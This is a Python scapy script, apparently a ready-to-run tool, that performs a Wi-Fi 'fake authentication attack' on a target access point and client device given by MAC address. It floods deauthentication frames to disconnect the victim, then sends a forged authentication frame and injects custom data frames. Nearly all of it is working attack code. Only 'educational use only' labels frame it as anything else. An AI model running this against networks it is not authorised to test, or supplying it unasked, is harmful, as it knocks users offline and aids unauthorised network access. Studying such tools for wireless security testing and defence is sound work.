import argparse
from scapy.all import *
import time
from colorama import Fore, Style, init

# Initialize colorama for Windows compatibility
init()

# Function to print a banner
def banner():
    # Colors from colorama
    yellow = Fore.YELLOW
    red = Fore.RED
    reset = Style.RESET_ALL

    syringe = f"""
       {yellow}_____{reset}
       {yellow}__H__{reset}
        ["]
        [)] 
        [)] {red}
        |V.{reset}
    """
    print(syringe)

# Function to send deauthentication packets
def send_deauth(iface, bssid, target_mac):
    print("[+] Sending deauthentication packets...")
    pkt = RadioTap()/Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)/Dot11Deauth()
    sendp(pkt, iface=iface, count=100, inter=0.01, verbose=0)  # Increased packet count and reduced interval for powerful injection

# Function to perform fake authentication
def fake_auth(iface, bssid, target_mac):
    print("[+] Performing fake authentication...")
    auth_packet = RadioTap()/Dot11(addr1=bssid, addr2=target_mac, addr3=bssid)/Dot11Auth(algo=0, seqnum=1, status=0)
    sendp(auth_packet, iface=iface, verbose=0)

# Function to inject arbitrary packets
def packet_injection(iface, bssid, target_mac):
    print("[+] Performing packet injection...")
    custom_packet = RadioTap()/Dot11(addr1=bssid, addr2=target_mac, addr3=bssid)/LLC()/SNAP()/Raw(load="CustomPayload")
    sendp(custom_packet, iface=iface, count=50, inter=0.02, verbose=0)  # Custom payload injection

# Main function
def main(args):
    print("[+] Starting Fake Authentication Attack (Educational Use Only)")
    send_deauth(args.iface, args.bssid, args.target_mac)
    time.sleep(1)  # Wait a bit to ensure disassociation
    fake_auth(args.iface, args.bssid, args.target_mac)
    packet_injection(args.iface, args.bssid, args.target_mac)
    print("[+] Fake authentication and packet injection completed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Perform a Fake Authentication Attack on a wireless network (Educational use only).")
    
    # Arguments for the script
    parser.add_argument("-i", "--iface", type=str, required=True, help="Monitor mode interface (e.g., wlan0mon)")
    parser.add_argument("-b", "--bssid", type=str, required=True, help="BSSID (MAC address) of the target access point")
    parser.add_argument("-t", "--target_mac", type=str, required=True, help="Target device MAC address")

    # Parse arguments
    args = parser.parse_args()

    # Display banner
    banner()

    # Print command usage
    print("\nUsage: python script.py -i <iface> -b <bssid> -t <target_mac>")
    
    # Run the main function with the parsed arguments
    main(args)
